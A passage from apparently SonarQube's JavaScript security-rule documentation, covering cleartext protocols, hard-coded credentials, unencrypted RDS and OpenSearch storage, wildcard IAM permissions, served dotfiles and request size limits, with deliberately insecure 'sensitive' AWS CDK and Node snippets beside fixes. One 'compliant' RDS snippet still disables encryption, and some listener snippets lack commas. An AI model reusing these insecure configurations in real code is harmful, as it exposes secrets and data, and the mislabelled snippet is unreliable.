<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationLoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>
<pre>
import { ApplicationLoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

const alb &#61; new ApplicationLoadBalancer(this, &#39;ALB&#39;, {
  vpc: vpc,
  internetFacing: true
});

alb.addListener(&#39;listener-https-explicit&#39;, {
  protocol: ApplicationProtocol.HTTPS,
  port: 8080,
  open: true,
  certificates: [certificate]
});

alb.addListener(&#39;listener-https-implicit&#39;, {
  port: 8080,
  open: true,
  certificates: [certificate]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationListener.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationListener</a>:</p>
<pre>
import { ApplicationListener } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

new ApplicationListener(this, &#39;listener-https-explicit&#39;, {
  loadBalancer: loadBalancer,
  protocol: ApplicationProtocol.HTTPS,
  port: 8080,
  open: true,
  certificates: [certificate]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkLoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkLoadBalancer</a>:</p>
<pre>
import { NetworkLoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

const nlb &#61; new NetworkLoadBalancer(this, &#39;nlb&#39;, {
  vpc: vpc,
  internetFacing: true
});

nlb.addListener(&#39;listener-tls-explicit&#39;, {
  protocol: Protocol.TLS,
  port: 1234,
  certificates: [certificate]
});

nlb.addListener(&#39;listener-tls-implicit&#39;, {
  port: 1234,
  certificates: [certificate]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.NetworkListener.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.NetworkListener</a>:</p>
<pre>
import { NetworkListener } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

new NetworkListener(this, &#39;listener-tls-explicit&#39;, {
  loadBalancer: loadBalancer,
  protocol: Protocol.TLS,
  port: 8080,
  certificates: [certificate]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.CfnListener.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancingv2.CfnListener</a>:</p>
<pre>
import { CfnListener } from &#39;aws-cdk-lib/aws-elasticloadbalancingv2&#39;;

new CfnListener(this, &#39;listener-https&#39;, {
  defaultActions: defaultActions,
  loadBalancerArn: loadBalancerArn,
  protocol: &#34;HTTPS&#34;,
  port: 80
  certificates: [certificate]
});

new CfnListener(this, &#39;listener-tls&#39;, {
  defaultActions: defaultActions,
  loadBalancerArn: loadBalancerArn,
  protocol: &#34;TLS&#34;,
  port: 80
  certificates: [certificate]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.CfnLoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancing.CfnLoadBalancer</a>:</p>
<pre>
import { CfnLoadBalancer } from &#39;aws-cdk-lib/aws-elasticloadbalancing&#39;;

new CfnLoadBalancer(this, &#39;elb-ssl&#39;, {
  listeners: [{
    instancePort: &#39;1000&#39;,
    loadBalancerPort: &#39;1000&#39;,
    protocol: &#39;ssl&#39;,
    sslCertificateId: sslCertificateId
  }]
});

new CfnLoadBalancer(this, &#39;elb-https&#39;, {
  listeners: [{
    instancePort: &#39;1000&#39;,
    loadBalancerPort: &#39;1000&#39;,
    protocol: &#39;https&#39;,
    sslCertificateId: sslCertificateId
  }]
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancing.LoadBalancer.html" rel="nofollow">aws-cdk-lib.aws-elasticloadbalancing.LoadBalancer</a>:</p>
<pre>
import { LoadBalancer, LoadBalancingProtocol } from &#39;aws-cdk-lib/aws-elasticloadbalancing&#39;;

const lb &#61; new LoadBalancer(this, &#39;elb-ssl&#39;, {
  vpc,
  internetFacing: true,
  healthCheck: {
    port: 80,
  },
  listeners: [
    {
      externalPort:10000,
      externalProtocol:LoadBalancingProtocol.SSL,
      internalPort:10000
    }]
});

lb.addListener({
  externalPort:10001,
  externalProtocol:LoadBalancingProtocol.SSL,
  internalPort:10001
});
lb.addListener({
  externalPort:10002,
  externalProtocol:LoadBalancingProtocol.HTTPS,
  internalPort:10002
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticache.CfnReplicationGroup.html" rel="nofollow">aws-cdk-lib.aws-elasticache.CfnReplicationGroup</a>:</p>
<pre>
import { CfnReplicationGroup } from &#39;aws-cdk-lib/aws-elasticache&#39;;

new CfnReplicationGroup(this, &#39;encrypted-explicit&#39;, {
  replicationGroupDescription: &#39;example&#39;,
  transitEncryptionEnabled: true
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.Stream.html" rel="nofollow">aws-cdk-lib.aws-kinesis.Stream</a>:</p>
<pre>
import { Stream } from &#39;aws-cdk-lib/aws-kinesis&#39;;

new Stream(this, &#39;stream-implicit-encrypted&#39;);

new Stream(this, &#39;stream-explicit-encrypted-selfmanaged&#39;, {
  encryption: StreamEncryption.KMS,
  encryptionKey: encryptionKey,
});

new Stream(this, &#39;stream-explicit-encrypted-managed&#39;, {
  encryption: StreamEncryption.MANAGED
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_kinesis.CfnStream.html" rel="nofollow">aws-cdk-lib.aws-kinesis.CfnStream</a>:</p>
<pre>
import { CfnStream } from &#39;aws-cdk-lib/aws-kinesis&#39;;

new CfnStream(this, &#39;cfnstream-explicit-encrypted&#39;, {
  streamEncryption: {
    encryptionType: encryptionType,
    keyId: encryptionKey.keyId,
  }
});
</pre>
<h2>Exceptions</h2>
<p>No issue is reported for the following cases because they are not considered sensitive:</p>
<ul><li> Insecure protocol scheme followed by loopback addresses like 127.0.0.1 or <code>localhost</code>. </li></ul>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://www.owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements" rel="nofollow">Mobile AppSec Verification
  Standard</a> - Network Communication Requirements </li><li> <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication" rel="nofollow">OWASP Mobile Top 10 2016 Category M3</a> - Insecure
  Communication </li><li> <a href="https://cwe.mitre.org/data/definitions/200" rel="nofollow">MITRE, CWE-200</a> - Exposure of Sensitive Information to an Unauthorized Actor </li><li> <a href="https://cwe.mitre.org/data/definitions/319" rel="nofollow">MITRE, CWE-319</a> - Cleartext Transmission of Sensitive Information </li><li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html" rel="nofollow">Google, Moving towards more secure web</a> </li><li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/" rel="nofollow">Mozilla, Deprecating non secure http</a> </li><li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html" rel="nofollow">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li><li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html" rel="nofollow">AWS
  Documentation</a> - Stream Encryption </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S2068">
              javascript:S2068
            </a>
          </td>
          <td>
            <details>
              <p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true
for applications that are distributed or that are open-source.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2019-13466" rel="nofollow">CVE-2019-13466</a> </li><li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name&#61;CVE-2018-15389" rel="nofollow">CVE-2018-15389</a> </li></ul>
<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>
<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection
strings, and for variable names that match any of the patterns from the provided list.</p>
<p>It’s recommended to customize the configuration of this rule with additional credential words such as &#34;oauthToken&#34;, &#34;secret&#34;, …​</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li><li> Credentials are used in production environments. </li><li> Application re-distribution is required before updating the credentials. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Store the credentials in a configuration file that is not pushed to the code repository. </li><li> Store the credentials in a database. </li><li> Use your cloud provider’s service for managing secrets. </li><li> If a password has been disclosed through the source code: change it. </li></ul>
<h2>Sensitive Code Example</h2>
<pre>
var mysql &#61; require(&#39;mysql&#39;);

var connection &#61; mysql.createConnection(
{
  host:&#39;localhost&#39;,
  user: &#34;admin&#34;,
  database: &#34;project&#34;,
  password: &#34;mypassword&#34;, // sensitive
  multipleStatements: true
});

connection.connect();
</pre>
<h2>Compliant Solution</h2>
<pre>
var mysql &#61; require(&#39;mysql&#39;);

var connection &#61; mysql.createConnection({
  host: process.env.MYSQL_URL,
  user: process.env.MYSQL_USERNAME,
  password: process.env.MYSQL_PASSWORD,
  database: process.env.MYSQL_DATABASE
});
connection.connect();
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/" rel="nofollow">OWASP Top 10 2021 Category A7</a> - Identification and
  Authentication Failures </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication" rel="nofollow">OWASP Top 10 2017 Category A2</a> - Broken Authentication
  </li><li> <a href="https://cwe.mitre.org/data/definitions/798" rel="nofollow">MITRE, CWE-798</a> - Use of Hard-coded Credentials </li><li> <a href="https://cwe.mitre.org/data/definitions/259" rel="nofollow">MITRE, CWE-259</a> - Use of Hard-coded Password </li><li> <a href="https://www.sans.org/top25-software-errors/#cat3" rel="nofollow">SANS Top 25</a> - Porous Defenses </li><li> Derived from FindSecBugs rule <a href="https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD" rel="nofollow">Hard Coded Password</a> </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6303">
              javascript:S6303
            </a>
          </td>
          <td>
            <details>
              <p>Using unencrypted RDS DB resources exposes data to unauthorized access.<br /> This includes database data, logs, automatic backups, read replicas,
snapshots, and cluster metadata.</p>
<p>This situation can occur in a variety of scenarios, such as:</p>
<ul><li> A malicious insider working at the cloud provider gains physical access to the storage device. </li><li> Unknown attackers penetrate the cloud provider’s logical infrastructure and systems. </li></ul>
<p>After a successful intrusion, the underlying applications are exposed to:</p>
<ul><li> theft of intellectual property and/or personal data </li><li> extortion </li><li> denial of services and security bypasses via data corruption or deletion </li></ul>
<p>AWS-managed encryption at rest reduces this risk with a simple switch.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The database contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to enable encryption at rest on any RDS DB resource, regardless of the engine.<br /> In any case, no further maintenance is
required as encryption at rest is fully managed by AWS.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.CfnDBCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

new rds.CfnDBCluster(this, &#39;example&#39;, {
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.CfnDBInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

new rds.CfnDBInstance(this, &#39;example&#39;, {
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;
import { aws_ec2 as ec2 } from &#39;aws-cdk-lib&#39;;

declare const vpc: ec2.Vpc;

const cluster &#61; new rds.DatabaseCluster(this, &#39;example&#39;, {
  engine: rds.DatabaseClusterEngine.auroraMysql({ version: rds.AuroraMysqlEngineVersion.VER_2_08_1 }),
  instanceProps: {
    vpcSubnets: {
      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,
    },
    vpc,
  },
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const vpc: ec2.Vpc;

new rds.DatabaseClusterFromSnapshot(this, &#39;example&#39;, {
  engine: rds.DatabaseClusterEngine.aurora({ version: rds.AuroraEngineVersion.VER_1_22_2 }),
  instanceProps: {
    vpc,
  },
  snapshotIdentifier: &#39;exampleSnapshot&#39;,
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const vpc: ec2.Vpc;

new rds.DatabaseInstance(this, &#39;example&#39;, {
  engine: rds.DatabaseInstanceEngine.POSTGRES,
  vpc,
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const sourceInstance: rds.DatabaseInstance;

new rds.DatabaseInstanceReadReplica(this, &#39;example&#39;, {
  sourceDatabaseInstance: sourceInstance,
  instanceType: ec2.InstanceType.of(ec2.InstanceClass.BURSTABLE2, ec2.InstanceSize.LARGE),
  vpc,
  storageEncrypted: false, // Sensitive
});
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBCluster.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.CfnDBCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

new rds.CfnDBCluster(this, &#39;example&#39;, {
  storageEncrypted: true,
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.CfnDBInstance.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.CfnDBInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

new rds.CfnDBInstance(this, &#39;example&#39;, {
  storageEncrypted: true,
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseCluster.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseCluster</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const vpc: ec2.Vpc;

const cluster &#61; new rds.DatabaseCluster(this, &#39;example&#39;, {
  engine: rds.DatabaseClusterEngine.auroraMysql({ version: rds.AuroraMysqlEngineVersion.VER_2_08_1 }),
  instanceProps: {
    vpcSubnets: {
      subnetType: ec2.SubnetType.PRIVATE_WITH_EGRESS,
    },
    vpc,
  },
  storageEncrypted: false, // Sensitive
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseClusterFromSnapshot</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const vpc: ec2.Vpc;

new rds.DatabaseClusterFromSnapshot(this, &#39;example&#39;, {
  engine: rds.DatabaseClusterEngine.aurora({ version: rds.AuroraEngineVersion.VER_1_22_2 }),
  instanceProps: {
    vpc,
  },
  snapshotIdentifier: &#39;exampleSnapshot&#39;,
  storageEncrypted: true,
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstance.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseInstance</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const vpc: ec2.Vpc;

new rds.DatabaseInstance(this, &#39;example&#39;, {
  engine: rds.DatabaseInstanceEngine.POSTGRES,
  vpc,
  storageEncrypted: true,
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica.html" rel="nofollow"><code>aws-cdk-lib.aws_rds.DatabaseInstanceReadReplica</code></a>:</p>
<pre>
import { aws_rds as rds } from &#39;aws-cdk-lib&#39;;

declare const sourceInstance: rds.DatabaseInstance;

new rds.DatabaseInstanceReadReplica(this, &#39;example&#39;, {
  sourceDatabaseInstance: sourceInstance,
  instanceType: ec2.InstanceType.of(ec2.InstanceClass.BURSTABLE2, ec2.InstanceSize.LARGE),
  vpc,
  storageEncrypted: true,
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://docs.aws.amazon.com/AmazonRDS/latest/UserGuide/Overview.Encryption.html" rel="nofollow">AWS Documentation</a> - Encrypting Amazon RDS
  resources </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6302">
              javascript:S6302
            </a>
          </td>
          <td>
            <details>
              <p>A policy that grants all permissions may indicate an improper access control, which violates <a href="https://en.wikipedia.org/wiki/Principle_of_least_privilege" rel="nofollow">the principle of least privilege</a>. Suppose an identity is granted full
permissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources
may occur and therefore result in loss of information.</p>
<h2>Ask Yourself Whether</h2>
<p>Identities obtaining all the permissions:</p>
<ul><li> only require a subset of these permissions to perform the intended function. </li><li> have monitored activity showing that only a subset of these permissions is actually used. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start
with the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in
production, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>
<h2>Sensitive Code Example</h2>
<p>A customer-managed policy that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>
<pre>
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;

new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: [&#34;*&#34;], // Sensitive
    resources: [&#34;arn:aws:iam:::user/*&#34;],
})
</pre>
<h2>Compliant Solution</h2>
<p>A customer-managed policy that grants only the required permissions:</p>
<pre>
import { aws_iam as iam } from &#39;aws-cdk-lib&#39;

new iam.PolicyStatement({
    effect: iam.Effect.ALLOW,
    actions: [&#34;iam:GetAccountSummary&#34;],
    resources: [&#34;arn:aws:iam:::user/*&#34;],
})
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/" rel="nofollow">OWASP Top 10 2021 Category A1</a> - Broken Access Control </li><li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege" rel="nofollow">AWS Documentation</a> - Grant least
  privilege </li><li> <a href="https://cloud.google.com/iam/docs/understanding-roles" rel="nofollow">Google Cloud Documentation</a> - Understanding roles </li><li> <a href="https://cwe.mitre.org/data/definitions/732" rel="nofollow">MITRE, CWE-732</a> - Incorrect Permission Assignment for Critical Resource </li><li> <a href="https://cwe.mitre.org/data/definitions/284" rel="nofollow">MITRE, CWE-284</a> - Improper Access Control </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control" rel="nofollow">OWASP Top 10 2017 Category A5</a> - Broken Access Control
  </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S6308">
              javascript:S6308
            </a>
          </td>
          <td>
            <details>
              <p>Amazon OpenSearch Service is a managed service to host OpenSearch instances. It replaces Elasticsearch Service, which has been deprecated.</p>
<p>To harden domain (cluster) data in case of unauthorized access, OpenSearch provides data-at-rest encryption if the engine is OpenSearch (any
version), or Elasticsearch with a version of 5.1 or above. Enabling encryption at rest will help protect:</p>
<ul><li> indices </li><li> logs </li><li> swap files </li><li> data in the application directory </li><li> automated snapshots </li></ul>
<p>Thus, adversaries cannot access the data if they gain physical access to the storage medium.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> The database contains sensitive data that could cause harm when leaked. </li><li> There are compliance requirements for the service to store data encrypted. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to encrypt OpenSearch domains that contain sensitive information.</p>
<p>OpenSearch handles encryption and decryption transparently, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.Domain.html" rel="nofollow">aws-cdk-lib.aws_opensearchservice.Domain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from &#39;aws-cdk-lib&#39;;

const exampleDomain &#61; new opensearchservice.Domain(this, &#39;ExampleDomain&#39;, {
  version: EngineVersion.OPENSEARCH_1_3,
}); // Sensitive, encryption must be explicitly enabled
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.CfnDomain.html" rel="nofollow">aws-cdk-lib.aws_opensearchservice.CfnDomain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from &#39;aws-cdk-lib&#39;;

const exampleCfnDomain &#61; new opensearchservice.CfnDomain(this, &#39;ExampleCfnDomain&#39;, {
  engineVersion: &#39;OpenSearch_1.3&#39;,
}); // Sensitive, encryption must be explicitly enabled
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.Domain.html" rel="nofollow">aws-cdk-lib.aws_opensearchservice.Domain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from &#39;aws-cdk-lib&#39;;

const exampleDomain &#61; new opensearchservice.Domain(this, &#39;ExampleDomain&#39;, {
  version: EngineVersion.OPENSEARCH_1_3,
  encryptionAtRest: {
    enabled: true,
  },
});
</pre>
<p>For <a href="https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_opensearchservice.CfnDomain.html" rel="nofollow">aws-cdk-lib.aws_opensearchservice.CfnDomain</a>:</p>
<pre>
import { aws_opensearchservice as opensearchservice } from &#39;aws-cdk-lib&#39;;

const exampleCfnDomain &#61; new opensearchservice.CfnDomain(this, &#39;ExampleCfnDomain&#39;, {
  engineVersion: &#39;OpenSearch_1.3&#39;,
  encryptionAtRestOptions: {
    enabled: true,
  },
});
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/" rel="nofollow">OWASP Top 10 2021 Category A2</a> - Cryptographic Failures </li><li> <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/" rel="nofollow">OWASP Top 10 2021 Category A4</a> - Insecure Design </li><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://docs.aws.amazon.com/opensearch-service/latest/developerguide/encryption-at-rest.html" rel="nofollow">AWS Documentation</a> - Encryption of
  data at rest for Amazon OpenSearch Service </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure" rel="nofollow">OWASP Top 10 2017 Category A3</a> - Sensitive Data
  Exposure </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration.html" rel="nofollow">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li><li> <a href="https://cwe.mitre.org/data/definitions/311" rel="nofollow">MITRE, CWE-311</a> - Missing Encryption of Sensitive Data </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5691">
              javascript:S5691
            </a>
          </td>
          <td>
            <details>
              <p>Hidden files are created automatically by many tools to save user-preferences, well-known examples are <code>.profile</code>, <code>.bashrc</code>,
<code>.bash_history</code> or .<code>git</code>. To simplify the view these files are not displayed by default using operating system commands like
<code>ls</code>.</p>
<p>Outside of the user environment, hidden files are sensitive because they are used to store privacy-related information or even hard-coded
secrets.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> Hidden files may have been inadvertently uploaded to the static server’s public directory and it accepts requests to hidden files. </li><li> There is no business use cases linked to serve files in <code>.name</code> format but the server is not configured to reject requests to this
  type of files. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> Disable the serving of hidden files. </li></ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/serve-static" rel="nofollow">Express.js serve-static</a> middleware:</p>
<pre>
let serveStatic &#61; require(&#34;serve-static&#34;);
let app &#61; express();
let serveStaticMiddleware &#61; serveStatic(&#39;public&#39;, { &#39;index&#39;: false, &#39;dotfiles&#39;: &#39;allow&#39;});   // Sensitive
app.use(serveStaticMiddleware);
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/serve-static" rel="nofollow">Express.js serve-static</a> middleware:</p>
<pre>
let serveStatic &#61; require(&#34;serve-static&#34;);
let app &#61; express();
let serveStaticMiddleware &#61; serveStatic(&#39;public&#39;, { &#39;index&#39;: false, &#39;dotfiles&#39;: &#39;ignore&#39;});   // Compliant: ignore or deny are recommended values
let serveStaticDefault &#61; serveStatic(&#39;public&#39;, { &#39;index&#39;: false});   // Compliant: by default, &#34;dotfiles&#34; (file or directory that begins with a dot) are not served (with the exception that files within a directory that begins with a dot are not ignored), see serve-static module documentation
app.use(serveStaticMiddleware);
</pre>
<h2>See</h2>
<ul><li> <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" rel="nofollow">OWASP Top 10 2021 Category A5</a> - Security Misconfiguration </li><li> <a href="https://github.com/mtojek/go-url-fuzzer" rel="nofollow">github.com/mtojek/go-url-fuzzer</a> - Discover hidden files and directories on a web server.
  </li><li> <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration" rel="nofollow">OWASP Web Top 10 2017 Category A6</a> - Security
  Misconfiguration. </li><li> <a href="https://cwe.mitre.org/data/definitions/538" rel="nofollow">MITRE, CWE-538</a> - File and Directory Information Exposure </li></ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=javascript:S5693">
              javascript:S5693
            </a>
          </td>
          <td>
            <details>
              <p>Rejecting requests with significant content length is a good practice to control the network traffic intensity and thus resource consumption in
order to prevents DoS attacks.</p>
<h2>Ask Yourself Whether</h2>
<ul><li> size limits are not defined for the different resources of the web application. </li><li> the web application is not protected by <a href="https://en.wikipedia.org/wiki/Rate_limiting" rel="nofollow">rate limiting</a> features. </li><li> the web application infrastructure has limited resources. </li></ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul><li> For most of the features of an application, it is recommended to limit the size of requests to:
    <ul><li> lower or equal to 8mb for file uploads. </li><li> lower or equal to 2mb for other requests. </li></ul>  </li></ul>
<p>It is recommended to customize the rule with the limit values that correspond to the web application.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/formidable" rel="nofollow">formidable</a> file upload module:</p>
<pre>
const form &#61; new Formidable();
form.maxFileSize &#61; 10000000; // Sensitive: 10MB is more than the recommended limit of 8MB

const formDefault &#61; new Formidable(); // Sensitive, the default value is 200MB
